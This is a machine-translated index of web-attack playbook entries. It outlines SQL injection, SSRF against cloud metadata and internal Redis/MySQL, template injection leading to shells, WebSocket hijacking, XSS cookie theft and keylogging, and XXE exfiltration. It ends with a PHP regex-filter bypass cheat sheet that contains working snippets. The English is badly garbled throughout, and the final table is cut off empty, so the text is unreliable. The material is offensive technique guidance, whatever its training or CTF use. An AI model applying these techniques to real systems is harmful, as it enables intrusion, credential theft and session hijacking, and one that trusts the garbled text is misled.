- Tags: sqli, blind, time
- Original Extracted Source: original extracted web-security-wiki source/sqli-time-based.md
Description:
based ontimelatency's/ofSQLBlind Injectiontechnique
Prerequisites:
- existat/inSQL Injection
- pageresponsetimecancontrol
Execution Outline:
1. 1. AcknowledgmenttimeBlind Injection
2. 2. GetDatabase namegrowdegree/measure
3. 3. 逐characterextract
4. 4. notsame/togetherDatabasedelayfunction
## Error-Based Injection
- ID: sqli-error-based
- Difficulty: intermediate
- Subcategory: Error-Based Injection
- Tags: sqli, error, extractvalue
- Original Extracted Source: original extracted web-security-wiki source/sqli-error-based.md
Description:
exploiterror/mistakeinformationextractdata's/ofSQL Injection
Prerequisites:
- existat/inSQL Injection
- error/mistakeinformationwill/canshow/displayshowat/inpageascend
Execution Outline:
1. 1. AcknowledgmentError-Based Injection
2. 2. GetDatabaseinformation
3. 3. Gettable name
4. 4. Getdata
## two阶SQL Injection
- ID: sqli-second-order
- Difficulty: advanced
- Subcategory: two阶Inject
- Tags: sqli, second-order, stored
- Original Extracted Source: original extracted web-security-wiki source/sqli-second-order.md
Description:
store after/backtrigger's/ofSQL Injectionattack
Prerequisites:
- existat/indatastoremeritcan
- storedataby (passive)two next/timeuse
Execution Outline:
1. 1. detect/probetwo阶Inject
2. 2. user nameInject
3. 3. Password ResetInject
4. 4. Order/commentInject
## UNION-Based Injection
- ID: sqli-union
- Difficulty: beginner
- Subcategory: 联combinequery
- Tags: sqli, union, select
- Original Extracted Source: original extracted web-security-wiki source/sqli-union.md
Description:
useUNION SELECTextractdata
Prerequisites:
- existat/inInjectpoint
- canshow/displayshowqueryresult/outcome
Execution Outline:
1. 1. determinescolumnnumber
2. 2. determinesshow/displayshowcolumn
3. 3. extractdata
4. 4. bypassFilter
## Stacked QueriesInject
- ID: sqli-stacked
- Difficulty: intermediate
- Subcategory: Stacked Queries
- Tags: sqli, stacked, queries
- Original Extracted Source: original extracted web-security-wiki source/sqli-stacked.md
Description:
Executemulti/multiple (classifier)SQL language sentence's/ofInject
Prerequisites:
- supportsmulti/multiple language sentenceExecute
- MySQL/PostgreSQL/MSSQL
Execution Outline:
1. 1. detect/probeStacked Queries
2. 2. MySQLStacked Queries
3. 3. MSSQLStacked Queries
4. 4. PostgreSQLStacked Queries
## SQL InjectionWAFbypass
- ID: sqli-waf-bypass
- Difficulty: advanced
- Subcategory: WAFbypass
- Tags: sqli, waf, bypass
- Original Extracted Source: original extracted web-security-wiki source/sqli-waf-bypass.md
Description:
bypassWebshould useFirewall's/oftechnique
Prerequisites:
- goal/targetexistat/inSQL Injectionpoint
- existat/inWAFprotection
Execution Outline:
1.  part/pointBlocktransmitinputEncoding
2. HTTPparameter污染(HPP)
3. etc.pricefunctionReplace
4. no/without逗numberInject

## References — web-playbook-19-ssrf-server-side-request-forgery

# SSRFServer-Side Request Forgery
English: SSRF Server-Side Request Forgery
- Entry Count: 12
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## foundation/basisSSRFattack
- ID: ssrf-basic
- Difficulty: intermediate
- Subcategory: foundation/basisattack
- Tags: ssrf, server-side, request
- Original Extracted Source: original extracted web-security-wiki source/ssrf-basic.md
Description:
Server-Side Request Forgeryfoundation/basisattacktechnique
Prerequisites:
- existat/inURLinputenterpoint
- Serverwill/canrequestuserprovide's/ofURL
Execution Outline:
1. 1. detect/probeSSRF
2. 2. Scanningintranet/internal networkPort
3. 3. Accessintranet/internal networkService
4. 4. ReadLocalFile
## AWSMetadataattack
- ID: ssrf-cloud-aws
- Difficulty: intermediate
- Subcategory: 云Metadata
- Tags: ssrf, aws, metadata, cloud
- Original Extracted Source: original extracted web-security-wiki source/ssrf-cloud-aws.md
Description:
exploitSSRFAccessAWS EC2MetadataService
Prerequisites:
- existat/inSSRFvulnerability
- goal/targetRunat/inAWS EC2ascend
Execution Outline:
1. 1. AccessMetadataService
2. 2. GetIAMCredential
3. 3. Getuserdata
4. 4. useIMDSv2bypass
## GCPMetadataattack
- ID: ssrf-cloud-gcp
- Difficulty: intermediate
- Subcategory: GCPMetadata
- Tags: ssrf, gcp, cloud, metadata
- Original Extracted Source: original extracted web-security-wiki source/ssrf-cloud-gcp.md
Description:
exploitSSRFattackGoogle CloudMetadataService
Prerequisites:
- existat/inSSRFvulnerability
- goal/targetRunat/inGCPenvironment
Execution Outline:
1. 1. AccessMetadataService
2. 2. GetAccessToken
3. 3. GetServiceaccountinformation
4. 4. Getitemeye/lookinformation
## AzureMetadataattack
- ID: ssrf-cloud-azure
- Difficulty: intermediate
- Subcategory: AzureMetadata
- Tags: ssrf, azure, cloud, metadata
- Original Extracted Source: original extracted web-security-wiki source/ssrf-cloud-azure.md
Description:
exploitSSRFattackAzureMetadataService
Prerequisites:
- existat/inSSRFvulnerability
- goal/targetRunat/inAzureenvironment
Execution Outline:
1. 1. AccessMetadataService
2. 2. GetAccessToken
3. 3. Getcalculate/computeinformation
4. 4. Getnetworkinformation
## SSRFProtocolexploit
- ID: ssrf-protocol
- Difficulty: intermediate
- Subcategory: Protocolexploit
- Tags: ssrf, protocol, file, gopher
- Original Extracted Source: original extracted web-security-wiki source/ssrf-protocol.md
Description:
exploiteach kind/typeProtocoladvancerowSSRFattack
Prerequisites:
- existat/inSSRFvulnerability
- ServersupportsmultipleProtocol
Execution Outline:
1. 1. FileProtocol
2. 2. DictProtocol
3. 3. GopherProtocol
4. 4. LDAPProtocol
## GopherProtocolattack
- ID: ssrf-gopher
- Difficulty: advanced
- Subcategory: Gopherattack
- Tags: ssrf, gopher, redis, mysql
- Original Extracted Source: original extracted web-security-wiki source/ssrf-gopher.md
Description:
exploitGopherProtocolattackintranet/internal networkService
Prerequisites:
- existat/inSSRFvulnerability
- ServersupportsGopherProtocol
Execution Outline:
1. 1. Gopherfoundation/basisformat
2. 2. attackRedis
3. 3. attackMySQL
4. 4. attackFastCGI
## DictProtocolattack
- ID: ssrf-dict
- Difficulty: intermediate
- Subcategory: DictProtocol
- Tags: ssrf, dict, redis, memcached
- Original Extracted Source: original extracted web-security-wiki source/ssrf-dict.md
Description:
exploitDictProtocoldetect/probeandattackintranet/internal networkService
Prerequisites:
- existat/inSSRFvulnerability
- ServersupportsDictProtocol
Execution Outline:
1. 1. DictProtocolformat
2. 2. detect/probeRedis
3. 3. detect/probeMemcached
4. 4. RedisWriteFile
## FileProtocolattack
- ID: ssrf-file
- Difficulty: beginner
- Subcategory: FileProtocol
- Tags: ssrf, file, lfi, read
- Original Extracted Source: original extracted web-security-wiki source/ssrf-file.md
Description:
exploitFileProtocolReadLocalFile
Prerequisites:
- existat/inSSRFvulnerability
- ServersupportsFileProtocol
Execution Outline:
1. 1. LinuxSensitiveFile
2. 2. WindowsSensitiveFile
3. 3. WebconfigurationFile
4. 4. 云environmentFile
## SSRFbypasstechnique
- ID: ssrf-bypass
- Difficulty: intermediate
- Subcategory: bypasstechnique
- Tags: ssrf, bypass, waf, filter
- Original Extracted Source: original extracted web-security-wiki source/ssrf-bypass.md
Description:
each kind/typebypassSSRFFilter's/oftechnique
Prerequisites:
- existat/inSSRFvulnerability
- existat/inFiltermachinemake/control
Execution Outline:
1. 1. IPformatbypass
2. 2. URLparsingdifference
3. 3.  re-/heavydefine to/towardsbypass
4. 4. DNS re-/heavyBind
## DNS re-/heavyBindattack
- ID: ssrf-dns-rebinding
- Difficulty: advanced
- Subcategory: DNS re-/heavyBind
- Tags: ssrf, dns, rebinding, bypass
- Original Extracted Source: original extracted web-security-wiki source/ssrf-dns-rebinding.md
Description:
exploitDNS re-/heavyBindbypassSSRFprotection
Prerequisites:
- existat/inSSRFvulnerability
- existat/inDNSparsingValidate
Execution Outline:
1. 1. DNS re-/heavyBindoriginal principle/logic
2. 2. usePublicService
3. 3. 自buildDNSServer
4. 4. attackprocess
## SSRFattackRedis
- ID: ssrf-redis
- Difficulty: intermediate
- Subcategory: Redisattack
- Tags: ssrf, redis, rce, webshell
- Original Extracted Source: original extracted web-security-wiki source/ssrf-redis.md
Description:
exploitSSRFattackintranet/internal networkRedisService
Prerequisites:
- existat/inSSRFvulnerability
- intranet/internal networkexistat/inunauthorizedRedis
Execution Outline:
1. 1. detect/probeRedis
2. 2. WriteWebShell
3. 3. WriteSSHPublic Key
4. 4. WriteCronTask
## SSRFattackMySQL
- ID: ssrf-mysql
- Difficulty: advanced
- Subcategory: MySQLattack
- Tags: ssrf, mysql, gopher, database
- Original Extracted Source: original extracted web-security-wiki source/ssrf-mysql.md
Description:
exploitSSRFattackintranet/internal networkMySQLService
Prerequisites:
- existat/inSSRFvulnerability
- intranet/internal networkexistat/inMySQLService
- know道MySQLuser name
Execution Outline:
1. 1. MySQLProtocolfoundation/basis
2. 2. useGopherattackMySQL
3. 3. usetoolgeneratePayload
4. 4. ExecuteSQLcommand

## References — web-playbook-20-ssti-template-injection

# SSTITemplate Injection
English: SSTI Template Injection
- Entry Count: 10
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## Jinja2Template Injection
- ID: ssti-jinja2
- Difficulty: advanced
- Subcategory: Jinja2
- Tags: ssti, jinja2, twig, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-jinja2.md
Description:
Jinja2/TwigTemplate Injectionattacktechnique
Prerequisites:
- useJinja2/Twigtemplatelead/guide擎
- userinputenterdirectreceive/connect渲染 totemplate
Execution Outline:
1. 1. detect/probeSSTI
2. 2. Information Gathering
3. 3. commandExecute
4. 4. ReverseShell
## FreeMarkerTemplate Injection
- ID: ssti-freemarker
- Difficulty: intermediate
- Subcategory: FreeMarker
- Tags: ssti, freemarker, java, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-freemarker.md
Description:
FreeMarkertemplatelead/guide擎Injectattacktechnique
Prerequisites:
- useFreeMarkertemplatelead/guide擎
- userinputenterdirectreceive/connect渲染 totemplate
Execution Outline:
1. 1. detect/probeSSTI
2. 2. Information Gathering
3. 3. commandExecute - new
4. 4. commandExecute - api
## VelocityTemplate Injection
- ID: ssti-velocity
- Difficulty: advanced
- Subcategory: Velocity
- Tags: ssti, velocity, java, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-velocity.md
Description:
Velocitytemplatelead/guide擎Injectattacktechnique
Prerequisites:
- useVelocitytemplatelead/guide擎
- userinputenterdirectreceive/connect渲染 totemplate
Execution Outline:
1. 1. detect/probeSSTI
2. 2. Information Gathering
3. 3. commandExecute - ClassTool
4. 4. commandExecute - negative/reverse射
## ThymeleafTemplate Injection
- ID: ssti-thymeleaf
- Difficulty: intermediate
- Subcategory: Thymeleaf
- Tags: ssti, thymeleaf, java, spring, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-thymeleaf.md
Description:
Thymeleaftemplatelead/guide擎Injectattacktechnique
Prerequisites:
- useThymeleaftemplatelead/guide擎
- SpringFramework
- userinputenterdirectreceive/connect渲染 totemplate
Execution Outline:
1. 1. detect/probeSSTI
2. 2. Information Gathering
3. 3. commandExecute - Springtablereach style/mode
4. 4. commandExecute - ProcessBuilder
## SmartyTemplate Injection
- ID: ssti-smarty
- Difficulty: intermediate
- Subcategory: Smarty
- Tags: ssti, smarty, php, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-smarty.md
Description:
Smartytemplatelead/guide擎Injectattacktechnique
Prerequisites:
- useSmartytemplatelead/guide擎
- userinputenterdirectreceive/connect渲染 totemplate
Execution Outline:
1. 1. detect/probeSSTI
2. 2. Information Gathering
3. 3. commandExecute - system
4. 4. commandExecute - passthru
## MakoTemplate Injection
- ID: ssti-mako
- Difficulty: intermediate
- Subcategory: Mako
- Tags: ssti, mako, python, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-mako.md
Description:
Makotemplatelead/guide擎Injectattacktechnique
Prerequisites:
- useMakotemplatelead/guide擎
- userinputenterdirectreceive/connect渲染 totemplate
Execution Outline:
1. 1. detect/probeSSTI
2. 2. Information Gathering
3. 3. commandExecute - osmoduleBlock
4. 4. commandExecute - subprocess
## TornadoTemplate Injection
- ID: ssti-tornado
- Difficulty: intermediate
- Subcategory: Tornado
- Tags: ssti, tornado, python, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-tornado.md
Description:
Tornadotemplatelead/guide擎Injectattacktechnique
Prerequisites:
- useTornadotemplatelead/guide擎
- userinputenterdirectreceive/connect渲染 totemplate
Execution Outline:
1. 1. detect/probeSSTI
2. 2. Information Gathering
3. 3. commandExecute - os
4. 4. commandExecute - subprocess
## DjangoTemplate Injection
- ID: ssti-django
- Difficulty: intermediate
- Subcategory: Django
- Tags: ssti, django, python, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-django.md
Description:
Djangotemplatelead/guide擎Injectattacktechnique
Prerequisites:
- useDjangotemplatelead/guide擎
- userinputenterdirectreceive/connect渲染 totemplate
Execution Outline:
1. 1. detect/probeSSTI
2. 2. Information Gathering
3. 3. commandExecute - via/throughsettings
4. 4. commandExecute -  for/to象chain
## ERBTemplate Injection
- ID: ssti-erb
- Difficulty: intermediate
- Subcategory: ERB
- Tags: ssti, erb, ruby, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-erb.md
Description:
ERB(Ruby)templatelead/guide擎Injectattacktechnique
Prerequisites:
- useERBtemplatelead/guide擎
- userinputenterdirectreceive/connect渲染 totemplate
Execution Outline:
1. 1. detect/probeSSTI
2. 2. Information Gathering
3. 3. commandExecute - negative/reverselead/guidenumber
4. 4. commandExecute - system
## Pug/JadeTemplate Injection
- ID: ssti-pug
- Difficulty: intermediate
- Subcategory: Pug
- Tags: ssti, pug, jade, nodejs, template
- Original Extracted Source: original extracted web-security-wiki source/ssti-pug.md
Description:
Pug/Jadetemplatelead/guide擎Injectattacktechnique
Prerequisites:
- usePug/Jadetemplatelead/guide擎
- userinputenterdirectreceive/connect渲染 totemplate
Execution Outline:
1. 1. detect/probeSSTI
2. 2. Information Gathering
3. 3. commandExecute - child_process
4. 4. commandExecute - execSync

## References — web-playbook-21-websocket-security

# WebSocketsecurity
English: WebSocket Security
- Entry Count: 3
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## WebSocket跨standHijack(CSWSH)
- ID: ws-hijack
- Difficulty: intermediate
- Subcategory: WebSocketHijack
- Tags: WebSocket, CSWSH, Origin, 跨stand, SessionHijack
- Original Extracted Source: original extracted web-security-wiki source/ws-hijack.md
Description:
exploitWebSocketgrasp手phase/stagemissingOriginValidate's/ofvulnerability，via/throughmaliciousnetwork页establishes跨standWebSocketConnection。AttackercanHijackVictim's/ofWebSocketSession，窃take/getReal-timedataor with/byVictimIdentitySendmessage。similar to at/inCSRF但针 for/toWebSocketProtocol。
Prerequisites:
- goal/targetuseWebSocketcommonmessage
- WebSocketgrasp手un-ValidateOrigin
Execution Outline:
1. 1. identifyWebSocketend(side)point
2. 2. construct跨standHijackPOCpage
3. 3. WebSocketmessageInject
4. 4. WebSocketStreamquantity/measureAnalysisfootthis
## WebSocketwalk私attack
- ID: ws-smuggling
- Difficulty: expert
- Subcategory: WebSocketwalk私
- Tags: WebSocket, walk私, Reverse Proxy, H2C, intranet/internal networkpenetrate透
- Original Extracted Source: original extracted web-security-wiki source/ws-smuggling.md
Description:
exploitReverse Proxy/Load Balancer for/toWebSocketProtocolprocess/handle's/ofdifference，via/throughWebSocketUpgraderequestwalk私HTTPrequest tointranet/internal networkService。AttackercanbypassFrontendsecuritycontroldirectreceive/connectand/withBackendcommonmessage，AccessProtected's/ofInternalAPIormanageinterface。
Prerequisites:
- goal/targetuseReverse Proxy(Nginx/Varnishetc.)
- ProxyallowsWebSocketUpgrade
- Backendexistat/inInternalService
Execution Outline:
1. 1. detectionWebSocketwalk私cancanproperty/nature
2. 2. WebSocketTunnelconstruct
3. 3. H2Cwalk私bypassAccesscontrol
4. 4. Reverse Proxydifferenceexploit
## WebSocketAuthenticationand/withAuthorizationbypass
- ID: ws-auth-bypass
- Difficulty: intermediate
- Subcategory: Authenticationbypass
- Tags: WebSocket, Authentication, Authorization, exceedright, TokenReplay
- Original Extracted Source: original extracted web-security-wiki source/ws-auth-bypass.md
Description:
exploitWebSocketConnectionestablishes after/backmissingcontinuousAuthenticationInspect/Check's/ofvulnerability，via/throughSessionfixed、TokenReplay、频道exceedrightsubscribeetc.way/mannerbypassAuthenticationandAuthorizationmachinemake/control。WebSocket's/ofgrowConnectionfeature make (complement)Permissionchange after/backoriginalConnection仍cankeepholdAccess。
Prerequisites:
- goal/targetuseWebSocketReal-timecommonmessage
- alreadyGethas/have效Session/Token
Execution Outline:
1. 1. WebSocketAuthenticationmachinemake/controlAnalysis
2. 2. TokenReplayand/withSessionfixed
3. 3. 频道/roombetweenexceedrightsubscribe
4. 4. WebSocketspeed/fast率limitationand/withDoSTest

## References — web-playbook-22-xss-cross-site-scripting

# XSS跨standfootthis
English: XSS Cross-Site Scripting
- Entry Count: 12
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## negative/reverse射 typeXSS
- ID: xss-reflected
- Difficulty: beginner
- Subcategory: negative/reverse射 type
- Tags: xss, reflected, javascript
- Original Extracted Source: original extracted web-security-wiki source/xss-reflected.md
Description:
negative/reverse射 typeCross-Site Scriptingtechnique
Prerequisites:
- existat/inuserinputenternegative/reverse射 topage
- inputenterun-经FilterorEncoding
Execution Outline:
1. 1. detect/probeXSSInjectpoint
2. 2. eventHandlerbypass
3. 3. tag/labelbypass
4. 4. 窃take/getCookie
## store typeXSS
- ID: xss-stored
- Difficulty: intermediate
- Subcategory: store type
- Tags: xss, stored, persistent
- Original Extracted Source: original extracted web-security-wiki source/xss-stored.md
Description:
store typeCross-Site Scriptingtechnique
Prerequisites:
- existat/indatastoremeritcan
- storedataun-经Filtershow/displayshow
Execution Outline:
1. 1. detect/probestorepoint
2. 2. 隐蔽Payload
3. 3. Persistencecontrol
4. 4. BeEF Hook
## DOM typeXSS
- ID: xss-dom
- Difficulty: intermediate
- Subcategory: DOM type
- Tags: xss, dom, javascript
- Original Extracted Source: original extracted web-security-wiki source/xss-dom.md
Description:
based onDOM's/ofCross-Site Scripting
Prerequisites:
- existat/inJavaScriptdynamicoperationDOM
- userinputenterdirectreceive/connectWriteDOM
Execution Outline:
1. 1. detect/probeDOM XSS
2. 2. commonSinkpoint
3. 3. location.hashexploit
4. 4. postMessageexploit
## CSPbypass
- ID: xss-csp-bypass
- Difficulty: advanced
- Subcategory: CSPbypass
- Tags: xss, csp, bypass
- Original Extracted Source: original extracted web-security-wiki source/xss-csp-bypass.md
Description:
bypasscontentSecurity Policy(CSP)'s/ofXSStechnique
Prerequisites:
- existat/inXSSvulnerability
- existat/inCSPstrategy但configurationnotwhen
Execution Outline:
1. 1. AnalysisCSPstrategy
2. 2. exploitunsafe-inline
3. 3. exploitunsafe-eval
4. 4. JSONPbypass
## 突变 typeXSS(mXSS)
- ID: xss-mxss
- Difficulty: advanced
- Subcategory: 突变 type
- Tags: xss, mxss, mutation, bypass
- Original Extracted Source: original extracted web-security-wiki source/xss-mxss.md
Description:
exploitBrowserparsingdifferenceleads to's/ofXSSattack
Prerequisites:
- existat/inHTMLinputexitpoint
- Browserparsingdifference
Execution Outline:
1. 1. foundation/basismXSSdetect/probe
2. 2. SVG mXSS
3. 3. Math mXSS
4. 4. DOM clobberingwith/combined with
## Unicode XSS
- ID: xss-unicode
- Difficulty: intermediate
- Subcategory: UnicodeEncoding
- Tags: xss, unicode, encoding, bypass
- Original Extracted Source: original extracted web-security-wiki source/xss-unicode.md
Description:
exploitUnicodeEncodingfeaturebypassFilter
Prerequisites:
- existat/inXSSInjectpoint
- filterInspect/Check close/shutkeyword
Execution Outline:
1. 1. UnicodeEscape
2. 2. HTMLsolidbodyEncoding
3. 3. Unicodespecification-izeattack
4. 4. UTF-7Encoding
## XSSfilterbypass
- ID: xss-filter-bypass
- Difficulty: intermediate
- Subcategory: filterbypass
- Tags: xss, filter, bypass, waf
- Original Extracted Source: original extracted web-security-wiki source/xss-filter-bypass.md
Description:
each kind/typebypassXSSfilter's/oftechnique
Prerequisites:
- existat/inXSSInjectpoint
- existat/inFiltermachinemake/control
Execution Outline:
1. 1. largesmallwriteObfuscation
2. 2. doublewritebypass
3. 3. commentObfuscation
4. 4. emptybyte截break/judge
## XSSEncodingbypass
- ID: xss-encoding
- Difficulty: intermediate
- Subcategory: Encodingbypass
- Tags: xss, encoding, bypass
- Original Extracted Source: original extracted web-security-wiki source/xss-encoding.md
Description:
exploiteach kind/typeEncodingtechniquebypassXSSFilter
Prerequisites:
- existat/inXSSInjectpoint
- existat/inEncodingprocess/handle
Execution Outline:
1. 1. URLEncoding
2. 2. HTMLsolidbodyEncoding
3. 3. JavaScriptEncoding
4. 4. CSSEncoding
## Polyglot XSS
- ID: xss-polyglot
- Difficulty: intermediate
- Subcategory: Polyglot
- Tags: xss, polyglot, universal
- Original Extracted Source: original extracted web-security-wiki source/xss-polyglot.md
Description:
multi/multipleenvironmentgeneral/universal's/ofXSS payload
Prerequisites:
- existat/inXSSInjectpoint
- notdetermines具bodyenvironment
Execution Outline:
1. 1. 经典Polyglot
2. 2. shortPolyglot
3. 3. attributeInjectPolyglot
4. 4. URLparameterPolyglot
## XSS Cookie窃take/get
- ID: xss-cookie-theft
- Difficulty: beginner
- Subcategory: Cookie窃take/get
- Tags: xss, cookie, theft, session
- Original Extracted Source: original extracted web-security-wiki source/xss-cookie-theft.md
Description:
exploitXSS窃take/getuserCookie
Prerequisites:
- existat/inXSSvulnerability
- Cookieun-settingHttpOnly
Execution Outline:
1. 1. foundation/basisCookie窃take/get
2. 2. Fetch API窃take/get
3. 3. XMLHttpRequest窃take/get
4. 4. Encodingtransmitinput
## XSSkeyroundLog/Record
- ID: xss-keylogger
- Difficulty: intermediate
- Subcategory: keyroundLog/Record
- Tags: xss, keylogger, credential
- Original Extracted Source: original extracted web-security-wiki source/xss-keylogger.md
Description:
exploitXSSLog/Recorduserkeyroundinputenter
Prerequisites:
- existat/instore typeXSS
- goal/targetpagehas/haveSensitiveinputenter
Execution Outline:
1. 1. foundation/basiskeyroundLog/Record
2. 2.  completewhole/integerkeyroundLog/Record
3. 3. tablesingle窃take/get
4. 4. tablesingleCommitHijack
## BeEFFrameworkexploit
- ID: xss-beef
- Difficulty: advanced
- Subcategory: BeEFexploit
- Tags: xss, beef, framework, exploitation
- Original Extracted Source: original extracted web-security-wiki source/xss-beef.md
Description:
useBeEFFrameworkadvancerowXSSexploit
Prerequisites:
- existat/inXSSvulnerability
- deploymentBeEFServer
Execution Outline:
1. 1. deploymentBeEF
2. 2. InjectHookfootthis
3. 3. often usecommand
4. 4. moduleBlockexploit

## References — web-playbook-23-xxe-entity-injection

# XXEsolidbodyInject
English: XXE Entity Injection
- Entry Count: 9
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## XXEfoundation/basisattack
- ID: xxe-basic
- Difficulty: intermediate
- Subcategory: foundation/basisattack
- Tags: xxe, xml, external, entity
- Original Extracted Source: original extracted web-security-wiki source/xxe-basic.md
Description:
XML External EntityInjectfoundation/basisattacktechnique
Prerequisites:
- existat/inXMLparsingmeritcan
- Externalsolidbodyun-by (passive)Disable
Execution Outline:
1. 1. detect/probeXXE
2. 2. ReadFile
3. 3. ReadPHPSourcecode
4. 4. SSRFattack
## Blind InjectionXXEattack
- ID: xxe-blind
- Difficulty: intermediate
- Subcategory: Blind InjectionXXE
- Tags: xxe, blind, oob, xml
- Original Extracted Source: original extracted web-security-wiki source/xxe-blind.md
Description:
no/withoutreturnshow/display's/ofXXEattacktechnique
Prerequisites:
- existat/inXMLparsing
- no/withoutdirectreceive/connectreturnshow/display
Execution Outline:
1. 1. Externalsolidbodydetect/probe
2. 2. parametersolidbody
3. 3. OOBoutbring/carrydata
## XXE OOBoutbring/carryattack
- ID: xxe-oob
- Difficulty: intermediate
- Subcategory: OOBoutbring/carry
- Tags: xxe, oob, exfiltration, xml
- Original Extracted Source: original extracted web-security-wiki source/xxe-oob.md
Description:
exploitOOBtechniqueoutbring/carryXXEdata
Prerequisites:
- existat/inXXEvulnerability
- cansend/issuestartExternalrequest
Execution Outline:
1. 1. HTTPoutbring/carry
2. 2. FTPoutbring/carry
3. 3. DNSoutbring/carry
## XXE+SSRFcombination attack
- ID: xxe-ssrf
- Difficulty: intermediate
- Subcategory: XXE+SSRF
- Tags: xxe, ssrf, combination, xml
- Original Extracted Source: original extracted web-security-wiki source/xxe-ssrf.md
Description:
exploitXXEImplementationSSRFattack
Prerequisites:
- existat/inXXEvulnerability
- intranet/internal networkcanAccess
Execution Outline:
1. 1. Scanningintranet/internal networkPort
2. 2. Accessintranet/internal networkService
## XXE toRCE
- ID: xxe-rce
- Difficulty: advanced
- Subcategory: XXE toRCE
- Tags: xxe, rce, php, expect
- Original Extracted Source: original extracted web-security-wiki source/xxe-rce.md
Description:
exploitXXEImplementationRemote Code Execution
Prerequisites:
- existat/inXXEvulnerability
- PHP expectExtensionLoad
Execution Outline:
1. 1. ExpectExtensionRCE
2. 2. WriteWebShell
## XXEFileRead
- ID: xxe-file-read
- Difficulty: beginner
- Subcategory: FileRead
- Tags: xxe, file, read, lfi
- Original Extracted Source: original extracted web-security-wiki source/xxe-file-read.md
Description:
exploitXXEReadServerFile
Prerequisites:
- existat/inXXEvulnerability
- has/haveFileReadPermission
Execution Outline:
1. 1. ReadLinuxFile
2. 2. ReadWindowsFile
3. 3. ReadWebconfiguration
4. 4. ReadSourcecode
## XXEExternalDTDexploit
- ID: xxe-dtd
- Difficulty: intermediate
- Subcategory: ExternalDTD
- Tags: xxe, dtd, external, xml
- Original Extracted Source: original extracted web-security-wiki source/xxe-dtd.md
Description:
exploitExternalDTDFileadvancerowXXEattack
Prerequisites:
- existat/inXXEvulnerability
- canAccessExternalDTD
Execution Outline:
1. 1. hostmaliciousDTD
2. 2. citationExternalDTD
3. 3. multi/multiplestepoutbring/carry
4. 4. error/mistakemessageLeak/Disclosure
## XLSXFileXXE
- ID: xxe-xlsx
- Difficulty: intermediate
- Subcategory: XLSXFileXXE
- Tags: xxe, xlsx, excel, office
- Original Extracted Source: original extracted web-security-wiki source/xxe-xlsx.md
Description:
exploitXLSXFileadvancerowXXEattack
Prerequisites:
- should useparsingXLSXFile
- existat/inXXEvulnerability
Execution Outline:
1. 1. DecompressionXLSXFile
2. 2. InjectXXE Payload
## DOCXFileXXE
- ID: xxe-docx
- Difficulty: intermediate
- Subcategory: DOCXFileXXE
- Tags: xxe, docx, word, office
- Original Extracted Source: original extracted web-security-wiki source/xxe-docx.md
Description:
exploitDOCXFileadvancerowXXEattack
Prerequisites:
- should useparsingDOCXFile
- existat/inXXEvulnerability
Execution Outline:
1. 1. DecompressionDOCXFile
2. 2. InjectXXE Payload

## References — web-playbook-24-php-regex-bypass

# PHP correct/positive rule/principlebypassquick reference

## coreoriginal principle/logic

PHP 's/of `preg_match()` functionat/inFilteruserinputentertime，often becausecorrect/positive rule/principletablereach style/modeset upplannotwhen而by (passive)bypass。
 principle/logicuntie/solvecorrect/positive rule/principle修饰symbol/characterand PHP typerowfor/isisbypass's/of close/shutkey。

## 1. largesmallwritebypass

**适 usecondition**: correct/positive rule/principle没has/have `i`（PCRE_CASELESS）修饰symbol/character

```php
// by (passive)Filter's/ofcorrect/positive rule/principle — no/without i 修饰symbol/character
preg_match("/n|c/m", $_GET['p']);  //  (classifier)Matchsmallwrite n and c

// bypassway/manner —  uselargewriteword母
// nss2 contain/includehas/have n → by (passive)Intercept
// Nss2 contain/includehas/have N → notMatchsmallwrite n → bypass become/successmerit！
// Ctf contain/includehas/have C → notMatchsmallwrite c → bypass become/successmerit！

// PHP  category/class nameandfunction namelargesmallwritenotSensitive
call_user_func('Nss2::Ctf');  // equivalent to nss2::ctf()
```

**Validatemethod**:  firstAcknowledgmentcorrect/positive rule/principleisno/notbring/carry `i` 修饰symbol/character， againdecidesuselargesmallwritebypass

## 2. array bypass

**适 usecondition**: function (classifier)acceptsstringparameter，transmitenterArraywill/canreturns false

```php
// preg_match() No.two (counter)parameterneedstring
// transmitenterArray → returns false + Warning → bypasscorrect/positive rule/principleInspect/Check

// URL: ?p[]=nss2&p[]=ctf
// $_GET['p'] = ['nss2', 'ctf']  (Arrayrather than string)
// preg_match("/n|c/m", ['nss2', 'ctf']) → false → bypass！

// call_user_func acceptsArray as/dofor/isreturn调
call_user_func(['nss2', 'ctf']);  // equivalent to nss2::ctf()
```

## 3. 换rowsymbol/characterbypass

**适 usecondition**: correct/positive rule/principleuse `^...$` 锚point + `m` 修饰symbol/character

```php
// commonerroruntie/solve：m 修饰symbol/characterwill not let /n/ Match换rowsymbol/character
// m 修饰symbol/character (classifier)impact ^ and $ 's/ofMatchrowfor/is（multi/multiplerowpattern）

// canbypass's/of情况：
preg_match("/^flag$/", $input);  // m 修饰symbol/characterdescendcan use %0aflag bypass

// cannotbypass's/of情况：
preg_match("/n|c/m", $input);    // m notimpact n and c 's/ofMatch
```

## 4. PCRE backtrackinglimitationbypass

**适 usecondition**: supergrowstring + backtrackingquantity/measurelarge's/ofcorrect/positive rule/principle

```php
// preg_match defaultbacktrackingascendlimit 1000000
// super past/excessive rule/principlereturns false（notis 0 or 1）

// constructsupergrowstringtriggerbacktrackinglimitation
$str = str_repeat('a', 1000000);
preg_match("/.*$/", $str);  // returns false → bypass
```

## 5. `%0a` 换rowInject

**适 usecondition**: correct/positive rule/principleuse `^...$` 但没has/have `s`（DOTALL）修饰symbol/character

```php
// bypass ^...$ 锚point
// inputenter: "good\nmalicious"
preg_match("/^good$/", "good\nmalicious");  // no/without m timenotMatch
preg_match("/^good$/m", "good\nmalicious");  // has/have m timeMatchNo.onerow
```

## common CTF problem typepattern

| type | correct/positive rule/principleexample | bypassway/manner |
|------|----------|----------|
